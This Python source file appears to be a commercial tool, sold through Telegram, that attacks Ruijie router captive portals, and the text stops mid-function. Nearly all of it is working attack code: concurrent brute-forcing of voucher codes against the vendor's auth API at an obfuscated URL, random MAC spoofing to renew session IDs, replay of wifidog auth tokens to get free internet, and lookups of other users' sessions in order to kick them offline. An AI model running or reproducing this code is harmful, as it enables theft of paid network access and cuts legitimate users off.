import os
import re
import sys
import zlib
import time
import ping3
import base64
import random
import string
import urllib
import marshal
import getpass
import aiohttp
import asyncio
import hashlib
import argparse
import requests
import subprocess
import importlib.util
from datetime import timedelta, datetime
from urllib.parse import unquote
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

__ALL__ = []
SUCCESS = 0
IN_RUNNING_BIN = []
MY = ""

try:
    ascii_lower_bin6 = open("ascii_lower_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin6 = []
try:
    ascii_lower_bin7 = open("ascii_lower_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_lower_bin7 = []
try:
    ascii_upper_bin6 = open("ascii_upper_bin6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin6 = []
try:
    ascii_upper_bin7 = open("ascii_upper_bin7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_upper_bin7 = []
try:
    ascii_bin_mix6 = open("ascii_bin_mix6.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix6 = []
try:
    ascii_bin_mix7 = open("ascii_bin_mix7.txt", "r").read().splitlines()
except FileNotFoundError:
    ascii_bin_mix7 = []

def clear():
    os.system("clear")

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def Line():
    print(f"{y}-\033[1;00m"*os.get_terminal_size()[0])

def Logo():
    clear()
    logo = f"""{r},-_/         .     ,--. .        .
'  | . . ,-. |-   | `-' |  . ,-. | ,
   | | | `-. |    |   . |  | |   |<
   | `-^ `-' `'   `--'  `' ' `-' ' `
/` |
`--'  {g}              Created by ZD\033[1;00m"""
    print(logo)
    Line()
    print(f"{w}[*] This tool is created by ZD")
    print(f"{w}[*] Creator telegram account @ZDxViolet")
    print(f"{w}[*] Reseller telegram channel @TTAK19")
    print(f"{w}[*] This tool is only for Ruijie Network Router")
    Line()
    
def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", help="features option", choices=["code", "internet", "check", "setup", "clean", "hotspot", "kick", "bypass"], required=True)
    parser.add_argument("-m", "--mode", help="type of voucher code", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix", "all"], default="digit")
    parser.add_argument("-l", "--length", help="length of voucher code(default 6)", choices=[6,7,8], type=int, default=6)
    parser.add_argument("-s", "--speed", help="voucher code bruteforce speed", type=int, default=200)
    parser.add_argument("-t", "--tasks", help="number of tasks for parallel works", type=int, default=200)
    parser.add_argument("-d", "--debug", help="to show debug message", action="store_true")
    parser.add_argument("-p", "--arrange", help="to arrange the voucher code", choices=["random", "da", "ad", "ada"], default="random")
    parser.add_argument("-dl", "--digit_length", help="length of digit", choices=["random", "1", "2","3", "4", "5", "6", "7"], default="random")
    parser.add_argument("-al", "--ascii_length", help="length of ascii", choices=["random", "1", "2","3", "4", "5", "6", "7"], default="random")
    args = parser.parse_args() 
    option = args.option
    mode = args.mode
    length = args.length
    speed = args.speed
    tasks = args.tasks
    debug = args.debug
    arrange = args.arrange
    digit_length = args.digit_length
    ascii_length = args.ascii_length
    try:
        digit_length = int(digit_length)
        digit_length_type = int
    except ValueError:
        digit_length = digit_length
        digit_length_type = str
    try:
        ascii_length = int(ascii_length)
        ascii_length_type = int
    except:
        ascii_length = ascii_length
        ascii_length_type = str
    if digit_length_type == int and ascii_length_type == int:
        if length > digit_length + ascii_length or length < digit_length + ascii_length:
            print(f"{y}[!] The length and the digit-length + ascii-length are must be the same")
            sys.exit(0)
            os._exit(0)
        elif length == digit_length + ascii_length:
            pass
        else:
            print(f"{y}[!] Internal Error: code -33")
            sys.exit(0)
            os._exit(0)
    elif digit_length_type == str and ascii_length_type == int:
        digit_length = length - ascii_length
    elif digit_length_type == int and ascii_length_type == str:
        ascii_length = length - digit_length
    elif digit_length_type == str and ascii_length_type == str:
        digit_length = digit_length
        ascii_length = ascii_length

    if option == "code":
        status = True#Security().check_key()
        if status:
            is_free_user = True
            vobj = VoucherCode(is_free_user=is_free_user, mode=mode, length=length, speed=speed, tasks=tasks, debug=debug, digit_length=digit_length, ascii_length=ascii_length, digit_length_type=digit_length_type, ascii_length_type=ascii_length_type, arrange=arrange)
            if mode == "digit":
                asyncio.run(vobj.execute_digit())
            elif mode == "ascii-lower" or mode == "ascii-upper" or mode == "ascii-mix":
                asyncio.run(vobj.execute_ascii())
            elif mode == "all":
                asyncio.run(vobj.execute_all())
        else:
            print(f"{r}[!] Internal Error: code -1")
            sys.exit(0)
    elif option == "internet":
        asyncio.run(InternetAccess().main())
    elif option == "kick":
        status = True#Security().check_key()
        if status:
            asyncio.run(BypassLimitedCode(mode=2))
        else:
            print(f"{r}[!] Internal Error: code -1")
            sys.exit(0)
    elif option == "bypass":
        status = True#Security().check_key()
        if status:
            asyncio.run(BypassLimitedCode(mode=1))
        else:
            print(f"{r}[!] Internal Error: code -1")
            sys.exit(0)
    elif option == "check":
        status = True#Security().check_key()
        if status:
            robj = RecheckVoucher()
            asyncio.run(robj.check())
        else:
            print(f"{r}[!] Internal Error: code -1")
            sys.exit(0)
    elif option == "setup":
        Setup().set()
    elif option == "clean":
        Cleaner().clean()
    elif option == "hotspot":
        Hotspot().main()

def get_mac():
    first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

async def get_session_id(session, session_url, previous_session_id, rep_mac=True):
    if rep_mac:
        mac = get_mac()
        session_url = replace_mac(session_url, new_mac=mac)
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=0, i',
        'referer': session_url,
        'sec-ch-ua': '"Chromium";v="148", "Microsoft Edge";v="148", "Not/A)Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0',
        'cookie':'sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%2C%22first_id%22%3A%22%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fgemini.google.com%2F%22%7D%2C%22identities%22%3A%22eyIkaWRlbnRpdHlfY29va2llX2lkIjoiMTllMGRkYmQ5ZjIxNTItMGRmOTQxZjJlZmM2YjA4LTRjNjU3YjU4LTEzMjcxMDQtMTllMGRkYmQ5ZjNhNjAifQ%3D%3D%22%2C%22history_login_id%22%3A%7B%22name%22%3A%22%22%2C%22value%22%3A%22%22%7D%2C%22%24device_id%22%3A%2219e0ddbd9f2152-0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'
    }
    try:
        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
            if session_id:
                return session_id.group(1)
            else:
                return False
    except:
        return previous_session_id

class InternetAccess:
    def __init__(self):
        Logo()
        try:
            self.ip = open('.ip', 'r').read().strip()
        except FileNotFoundError:
            print(f"{r}[!] IP not found, try again after setup")
            sys.exit(0)
        try:
           access_data = open('.access_data', 'r').read().strip()
        except FileNotFoundError:
            access_data = input(f"{g}[+] Enter Your Access Data: ")
        Logo()
        self.decode_access_data = self.decode_data(access_data)
    
    async def main(self):
        await execute(self.decode_access_data, self.ip)

    def decode_data(self, access_data):
        try:
            rm_extra64 = access_data[6:-3].encode()
            dec_64 = base64.b64decode(rm_extra64)
            rm_extra85 = dec_64[12:-9]
            decode_access_data = base64.a85decode(rm_extra85).decode()
            dec_data, uid = decode_access_data.split("WHOAMI")
            if str(os.getuid()) == uid:
                pass
            else:
                print(f"{r}[!] This Access Data is Not Yours")
                sys.exit(0)
            if len(dec_data) < 30:
                print(f"{r}[!] Access Data Error, Please Check Your Access Data")
                sys.exit(0)
                os._exit(0)
            with open(".access_data", "w") as f:
                f.write(access_data)
            return dec_data
        except Exception as er:
            print(f"{r}[!] Access Data Error, Please Check Your Access Data")
            sys.exit(0)
            os._exit(0)
    
async def get_ping():
    ping = await asyncio.to_thread(ping3.ping, "google.com")
    if ping is None:
        return f"{r}Unknown{w}"
    else:
        ping = int(ping * 1000)
        if ping >= 100:
            return f"{r}{str(ping)}{w}"
        elif ping >= 90:
            return f"{y}{str(ping)}{w}"
        elif ping < 90:
            return f"{g}{str(ping)}{w}"

async def execute(decode_access_data, ip):
    timeout = aiohttp.ClientTimeout(total=20)
    connector = aiohttp.TCPConnector(limit=1024)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        try:
            while True:
                previous_session_id = None
                while True:
                    print(f"{g}[*] Getting session id...")
                    Line()
                    session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    if session_id is False:
                        print(f"{y}[!] Session ID Not Found")
                        Line()
                        print(f"{y}[*] Will Try Again After 100 seconds")
                        Line()
                        time.sleep(100)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id is None:
                        print(f"{y}[!] Session ID Not Found")
                        Line()
                        print(f"{y}[*] Will Try Again After 5 seconds")
                        Line()
                        time.sleep(5)
                        session_id = await get_session_id(session, decode_access_data, previous_session_id, rep_mac=False)
                    elif session_id:
                        previous_session_id = session_id
                        print(f"{g}[+] Found Session ID: {session_id}")
                        Line()
                        break
                for i in range(3):
                    send_status = await send(session, ip, session_id)
                    if not send_status:
                        print(f"{r}[!] Internet Bypass Failed, Session Url May Expired")
                        Line()
                        print(f"{g}[+] Getting Ping...")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}")
                        Line()
                    else:
                        print(f"{g}[+] Internet Bypass Successful")
                        Line()
                        print(f"{g}[+] Getting Ping...")
                        Line()
                        ping = await get_ping()
                        print(f"{b}[*] Current Ping is {ping}")
                        Line()
                    time.sleep(10)
                time.sleep(5)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
            os._exit(0)
        except Exception as e:
            print(f"{r}[!] Process was stopted")
            sys.exit(0)
            os._exit(0)
    
async def send(session, ip, session_id):
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    params = {
        'token': session_id,
        'phoneNumber': 'HELLO WORLD',
    }
    try:
        async with session.get(f'http://{ip}:2060/wifidog/auth?', params=params, headers=headers, allow_redirects=True) as req:
            response = str(req.url)
            if "http://www.baidu.com" == response or "http://www.baidu.com/" == response or "http://portal-as.ruijienetworks.com/download/static/maccauth/src/success.html?" in response:
                return True
            else:
                return False
    except Exception as e:
        print(f"{y}[!] Sending Packages fail")
        Line()
        time.sleep(1.5)
        print(f"{y}[*] Trying to Send Again...")
        Line()
        time.sleep(1.5)
        return await send(session, ip, session_id)

async def login_voucher(session, session_id, voucher, file=None, check=False, debug=False):
    global SUCCESS
    data = {
        "accessCode": voucher,
        "sessionId": session_id,
        "apiVersion": 1
    }
    post_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    headers = {
        "authority": "portal-as.ruijienetworks.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://portal-as.ruijienetworks.com",
        "referer": f"https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?RES=./../expand/res/mrlev58jlgslg49ervu&IS_EG=0&sessionId={session_id}",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": f'Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }
    try:
        async with session.post(post_url, json=data, headers=headers) as req:
            response = await req.text()
    except Exception as Error:
        return
    if 'logonUrl' in response:
        SUCCESS += 1
        print(f'\033[1;32mSuccess: {voucher}')
        write_file(file="success.txt", data=voucher)
    elif 'expired' in response:
        if not check:
            print(f'\033[1;33mExpired: {voucher}')
        write_file(file, voucher)
    elif 'failed' in response:
        if debug:
            print(f'\033[1;31mFailed: {voucher}')
        write_file(file, voucher)
    elif 'STA' in response:
        if not check:
            print(f'\033[1;34mLimited: {voucher}')
        write_file(file, voucher)

def write_file(file, data):
    if file:
        with open(file, "a") as f:
            f.write(data+"\n")

def all_generator(digit_length, ascii_length, digit_length_type, ascii_length_type, length, arrange):
    if digit_length_type == str and ascii_length_type == str:
        if length == 6:
            pairs = [(1,5), (2,4), (3,3), (4,2)]
        elif length == 7:
            pairs = [(1,6), (2,5), (3,4), (4,3)]
        elif length == 8:
            pairs = [(1,7), (2,6), (3,5), (4,4)]
        pair = random.choice(pairs)
        dgt = "".join(random.choice(string.digits) for _ in range(pair[0])) 
        aci = "".join(random.choice(string.ascii_lowercase) for _ in range(pair[1]))
        if arrange == "da":
            voucher = dgt + aci
        elif arrange == "ad":
            voucher = aci + dgt
        elif arrange == "random":
            voucher = "".join(random.choice(string.digits+string.ascii_lowercase) for _ in range(length))
        elif arrange == "ada":
            laci = list(aci)
            for i in dgt:
                laci.insert(random.randint(1, len(laci) - 1), i)
            voucher = "".join(laci)
        if not voucher in IN_RUNNING_BIN:
            return voucher
        else:
            return all_generator(digit_length, ascii_length, digit_length_type, ascii_length_type, length, arrange)
    else:
        dgt = "".join(random.choice(string.digits) for _ in range(digit_length))
        aci = "".join(random.choice(string.ascii_lowercase) for _ in range(ascii_length))
        if arrange == "da":
            voucher = dgt + aci
        elif arrange == "ad":
            voucher = aci + dgt
        elif arrange == "random":
            combine = list(dgt + aci)
            random.shuffle(combine)
            voucher = "".join(combine)
        elif arrange == "ada":
            laci = list(aci)
            for i in dgt:
                laci.insert(random.randint(1, len(laci) - 1), i)
            voucher = "".join(laci)
        if not voucher in IN_RUNNING_BIN:
            return voucher
        else:
            return all_generator(digit_length, ascii_length, digit_length_type, ascii_length_type, length, arrange)

def ascii_generator(mode, length):
    if mode == "ascii-lower":
        voucher = "".join(random.choice(string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_lower_bin6 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_lower_bin7 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 8:
            if not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-upper":
        voucher = "".join(random.choice(string.ascii_uppercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_upper_bin6 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_upper_bin7 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 8:
            if not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
    elif mode == "ascii-mix":
        voucher = "".join(random.choice(string.ascii_uppercase+string.ascii_lowercase) for _ in range(length))
        if length == 6:
            if not voucher in ascii_bin_mix6 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 7:
            if not voucher in ascii_bin_mix7 and not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)
        elif length == 8:
            if not voucher in IN_RUNNING_BIN:
                return voucher
            else:
                return ascii_generator(mode, length)

def digit_generator(length):
    if length == 8:
        voucher = "".join(random.choice(string.digits) for _ in range(8))
        if not voucher in IN_RUNNING_BIN:
            return voucher
        else:
            return digit_generator(length)
    else:
        vouchers = []
        range_ = 1000000 if length == 6 else 10000000
        for i in range(0, range_):
            vouchers.append(str(i).zfill(length))
        return vouchers

def replace_mac(url, new_mac):
    url = re.sub(r'(?<=mac=)[^&]+', new_mac, url)       
    return url

def get_online_info(username):
    params = {
        "username":username,
        "usertype":"wifidog"
    }
    try:
        req = requests.get("http://10.44.77.240:2060/user/online_info", params=params).json()['data']
        return req
    except:
        Line()
        print(f"{r}[!] Failed to get info")
        sys.exit(0)
        
class BypassLimitedCode:
    def __init__(self, mode=None):
        Logo()
        self.limited_code = self.req_limited_code()
        try:
            self.ip = open('.ip', 'r').read().strip()
        except FileNotFoundError:
            print(f"{r}[!] IP not found, try again after setup")
            sys.exit(0)
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found try again after setup")
            sys.exit()
        code_info = get_online_info(self.limited_code)
        ip_list = []
        mac_list = []
        if len(code_info['list']) != 0:
            for i in code_info["list"]:
                mac_list.append(i["mac"])
            for i in code_info["list"]:
                ip_list.append(i["ip"])
        else:
            Line()
            print(f"{r}[!] No info with this code '{self.limited_code}'")
            sys.exit(0)
        Logo()
        print("\033[1;31mCode Info".center(os.get_terminal_size()[0], ' '))
        Line()
        print(f"{g}Voucher code: {self.limited_code}".center(os.get_terminal_size()[0], ' '))
        print(f"{g}Current user: {len(mac_list)}".center(os.get_terminal_size()[0], ' '))
        print(f"{g}Code type: {code_info['list'][0]['group_name']}".center(os.get_terminal_size()[0], ' '))
        print(f"{g}Expired on: {time.ctime(code_info['list'][0]['expire_time'])}".center(os.get_terminal_size()[0], ' '))
        Line()
        session_url_list = []
        for mac in mac_list:
            session_url_list.append(replace_mac(self.session_url, mac))
        if mode == 1:
            asyncio.run(execute(session_url_list[0], self.ip))
        elif mode == 2:
            asyncio.run(self.Kick(session_url_list, self.ip, self.limited_code, ip_list))

    def req_limited_code(self):
        limited_code = input(f"{g}[+] Enter Limited Code: ")
        if len(limited_code) < 6:
            Line()
            print(f"{r}[!] Invalid limited code '{limited_code}'")
            sys.exit(0)
        else:
            return limited_code

    async def Kick(self, session_url_list, ip, username, ip_list):
        print(f"{g}[*] Kick Out Process Can Only Kick Out One User at A Time")
        Line()
        user_ip = ip_list[0]
        session_url = session_url_list[0]
        connector = aiohttp.TCPConnector(limit=100)
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while True:
                print(f"{g}[*] Getting session id...")
                Line()
                session_id = await get_session_id(session, session_url, None, rep_mac=False)
                if session_id is False:
                    print(f"{y}[!] Session ID Not Found")
                    Line()
                    print(f"{y}[*] Will Try Again After 100 seconds")
                    Line()
                    time.sleep(100)
                    session_id = await get_session_id(session, session_url, None, rep_mac=False)
                elif session_id is None:
                    print(f"{y}[!] Session ID Not Found")
                    Line()
                    print(f"{y}[*] Will Try Again After 5 seconds")
                    Line()
                    time.sleep(5)
                    session_id = await get_session_id(session, session_url, None, rep_mac=False)
                elif session_id:
                    print(f"{g}[+] Found Session ID: {session_id}")
                    Line()
                    break
            status_list = []
            print(f"{g}[*] Packages Will Send 3 times")
            Line()
            for i in range(3):
                print(f"{g}[*] Sending Packages...")
                Line()
                status = await send(session, ip, session_id)
                status_list.append(status)
                print(f"{g}[+] Packages Sent")
                Line()
                time.sleep(2)
            if True in status_list:
                print(f"{g}[*] We Will Redirect You To Browser to Kick The Online User")
                Line()
                print(f"{g}[*] The Browser Will Be Open In 3 Seconds")
                Line()
                time.sleep(3)
                subprocess.run(["termux-open","http://10.44.77.240:2060"])
                sys.exit(0)
            else:
                print(f"{y}[*] Kick Out Process Was Failed")
                sys.exit(0)

class VoucherCode:
    def __init__(self, is_free_user=None, mode=None, length=None, speed=None, tasks=None, debug=True, digit_length=None, ascii_length=None, digit_length_type=None, ascii_length_type=None, arrange=None):
        self.is_free_user = is_free_user
        self.mode = mode
        self.length = length
        self.speed = speed
        self.tasks = tasks
        self.debug = debug
        self.digit_length = digit_length
        self.ascii_length = ascii_length
        self.digit_length_type = digit_length_type
        self.ascii_length_type = ascii_length_type
        self.arrange = arrange
        if not self.is_free_user:
            if is_reached_limit(True):
                print(f"{y}[!] You are reached limit")
                sys.exit(0)
        if self.mode == "digit":
            if self.length == 6:
                self.file = "failed.txt"
            elif self.length == 7:
                self.file = "failed7.txt"
            elif self.length == 8:
                self.file = None
        elif self.mode == "ascii-lower":
            if self.length == 6:
                self.file = "ascii_lower_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_lower_bin7.txt"
            elif self.length == 8:
                self.file = None
        elif self.mode == "ascii-upper":
            if self.length == 6:
                self.file = "ascii_upper_bin6.txt"
            elif self.length == 7:
                self.file = "ascii_upper_bin7.txt"
            elif self.length == 8:
                self.file = None
        elif self.mode == "ascii-mix":
            if self.length == 6:
                self.file = "ascii_bin_mix6.txt"
            elif self.length == 7:
                self.file = "ascii_bin_mix7.txt"
            elif self.length == 8:
                self.file = None
        elif self.mode == "all":
            self.file = None
        try:
            self.session_url = open(".session_url", "r").read().strip()
        except FileNotFoundError:
            print(f"{r}[!] Session url not found try again after setup")
            sys.exit()
    
    def remove_already_checked(self, vouchers):
        try:
            self.fail_code = set(open(self.file, "r").read().splitlines())
        except FileNotFoundError:
            self.fail_code = set()
        try:
            success_code = set(open("success.txt", "r").read().splitlines())
        except FileNotFoundError:
            success_code = set()
        self.removed = list(set(vouchers) - set(self.fail_code) - set(success_code))
        return list(self.removed), list(success_code), list(self.fail_code)

    async def execute_all(self):
        global IN_RUNNING_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        print(f"[*] Generated voucher codes (unlimited)")
        print(f"[*] success voucher codes are saved in local")
        Line()
        print(f"[*] Bruteforce mode {self.mode}")
        print(f"[*] Voucher code length {str(self.length)}")
        print(f"[*] Bruteforce speed {str(self.speed)}")
        print(f"[*] Bruteforce tasks {str(self.tasks)}")
        print(f"[*] Voucher code digit length {str(self.digit_length)}")
        print(f"[*] Voucher code ascii length {str(self.ascii_length)}")
        print(f"[*] Show debug message {str(self.debug)}")
        Line()
        print(f"{g}[+] Voucher code brutefore process is running...")
        Line()
        try:
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                tasks = []
                loop = 0
                while True:
                    voucher = all_generator(self.digit_length, self.ascii_length, self.digit_length_type, self.ascii_length_type, self.length, self.arrange)
                    if not self.is_free_user:
                        if SUCCESS >= 3:
                            is_reached_limit(False)
                            print(f"{y}[!] You are reached limit")
                            break
                    if loop % 90 == 0:
                        session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                    tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                    if len(tasks) >= self.tasks:
                        await asyncio.gather(*tasks)
                        tasks = []
                    loop += 1
                    IN_RUNNING_BIN.append(voucher)
                if tasks:
                    await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"{y}[*] User cancel called")
            sys.exit(0)
        Line()
        print(f"{g}[*] Process is finished")
        sys.exit(0)

    async def execute_ascii(self):
        global IN_RUNNING_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        if self.length == 8:
            Logo()
            print(f"[*] Generated voucher codes (unlimited)")
            print(f"[*] success and failed voucher codes are saved in local")
            Line()
            print(f"[*] Bruteforce mode {self.mode}")
            print(f"[*] Voucher code length {str(self.length)}")
            print(f"[*] Bruteforce speed {str(self.speed)}")
            print(f"[*] Bruteforce tasks {str(self.tasks)}")
            print(f"[*] Show debug message {str(self.debug)}")
            Line()
            print(f"{g}[+] Voucher code brutefore process is running...")
            Line()
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    tasks = []
                    loop = 0
                    while True:
                        voucher = ascii_generator(self.mode, self.length)
                        if not self.is_free_user:
                            if SUCCESS >= 3:
                                is_reached_limit(False)
                                print(f"{y}[!] You are reached limit")
                                break
                        if loop % 90 == 0:
                            session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                        tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                        if len(tasks) >= self.tasks:
                            await asyncio.gather(*tasks)
                            tasks = []
                        loop += 1
                        IN_RUNNING_BIN.append(voucher)
                    if tasks:
                        await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                print(f"{y}[*] User cancel called")
                sys.exit(0)
            Line()
            print(f"{g}[*] Process is finished")
            sys.exit(0)
        else:
            if self.mode == "ascii-lower" and self.length == 6:
                checked = str(len(ascii_lower_bin6))
            elif self.mode == "ascii-lower" and self.length == 7:
                checked = str(len(ascii_lower_bin7))
            elif self.mode == "ascii-upper" and self.length == 6:
                checked = str(len(ascii_upper_bin6))
            elif self.mode == "ascii-upper" and self.length == 7:
                checked = str(len(ascii_upper_bin7))
            elif self.mode == "ascii-mix" and self.length == 6:
                checked = str(len(ascii_bin_mix6))
            elif self.mode == "ascii-mix" and self.length == 7:
                checked = str(len(ascii_bin_mix7))
            Logo()
            print(f"[*] Generated voucher codes (unlimited)")
            print(f"[*] Already checked codes ({checked})")
            print(f"[*] success and failed voucher codes are saved in local")
            Line()
            print(f"[*] Bruteforce mode {self.mode}")
            print(f"[*] Voucher code length {str(self.length)}")
            print(f"[*] Bruteforce speed {str(self.speed)}")
            print(f"[*] Bruteforce tasks {str(self.tasks)}")
            print(f"[*] Show debug message {str(self.debug)}")
            Line()
            print(f"{g}[+] Voucher code brutefore process is running...")
            Line()
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    tasks = []
                    loop = 0
                    while True:
                        voucher = ascii_generator(self.mode, self.length)
                        if not self.is_free_user:
                            if SUCCESS >= 3:
                                is_reached_limit(False)
                                print(f"{y}[!] You are reached limit")
                                break
                        if loop % 90 == 0:
                            session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                        tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                        if len(tasks) >= self.tasks:
                            await asyncio.gather(*tasks)
                            tasks = []
                        loop += 1
                        IN_RUNNING_BIN.append(voucher)
                    if tasks:
                        await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                print(f"{y}[*] User cancel called")
                sys.exit(0)
            Line()
            print(f"{g}[*] Process is finished")
            sys.exit(0)

    async def execute_digit(self):
        global IN_RUNNING_BIN
        connector = aiohttp.TCPConnector(limit=self.speed)
        timeout = aiohttp.ClientTimeout(total=20)
        Logo()
        if self.length == 8:
            print(f"[*] Generated voucher codes (unlimited)")
            print(f"[*] Success voucher code are saved in local")
            Line()
            print(f"[*] Bruteforce mode {self.mode}")
            print(f"[*] Voucher code length {str(self.length)}")
            print(f"[*] Bruteforce speed {str(self.speed)}")
            print(f"[*] Bruteforce tasks {str(self.tasks)}")
            print(f"[*] Show debug message {str(self.debug)}")
            Line()
            print(f"{g}[+] Voucher code brutefore process is running...")
            Line()
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    tasks = []
                    loop = 0
                    while True:
                        voucher = digit_generator(self.length)
                        if not self.is_free_user:
                            if SUCCESS >= 3:
                                is_reached_limit(False)
                                print(f"{y}[!] You are reached limit")
                                break
                        if loop % 90 == 0:
                            session_id = await get_session_id(session, self.session_url, None, rep_mac=True)
                        tasks.append(login_voucher(session, session_id, voucher, file=self.file, debug=self.debug))
                        if len(tasks) >= self.tasks:
                            await asyncio.gather(*tasks)
                            tasks = []
                        loop += 1
                        IN_RUNNING_BIN.append(voucher)
                    if tasks:
                        await asyncio.gather(*tasks)
            except KeyboardInterrupt:
                print(f"{y}[*] User cancel called")
                sys.exit(0)
            Line()
            print(f"{g}[*] Process is finished")
            sys.exit(0)
        else:
            generated_code = digit_generator(length=self.length)
            vouchers_code, success_code, fail_code = self.remove_already_checked(generated_code)
            print(f"[*] Generated voucher codes ({len(generated_code)})")
            print(f"[*] Already checked codes ({len(generated_code)-len(vouchers_code)})")
            print(f"[*] Still remain to check codes ({len(vouchers_code)})")
            print(f"[*] success and failed voucher codes are saved in local")
            Line()
            print(f"[*] Bruteforce mode {self.mode}")
            print(f"[*] Voucher code length {str(self.length)}")
            print(f"[*] Bruteforce speed {str(self.speed)}")
            print(f"[*] Bruteforce tasks {str(self.tasks)}")
            print(f"[*] Show debug message {str(self.debug)}")
            Line()
            print(f"{g}[+] Voucher code brutefore process is running...")
            Line()
            try:
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    tasks = []
                    for loop, voucher in enumerate(vouchers_code, start=0):
                        if not self.is_free_user:
                            if SUCCESS >= 3:
                                is_reached_limit(False)
                                print(f"{y}[!] You are reached limit")
                                break
                        if loop % 90 == 0:
